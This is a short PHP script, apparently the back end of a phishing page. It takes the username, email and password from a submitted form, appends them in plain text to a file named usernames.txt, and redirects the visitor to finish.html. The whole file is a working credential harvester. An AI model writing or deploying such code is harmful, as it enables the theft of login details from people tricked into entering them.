<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . "Email" . $_POST['email'] ." Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: finish.html');
exit();
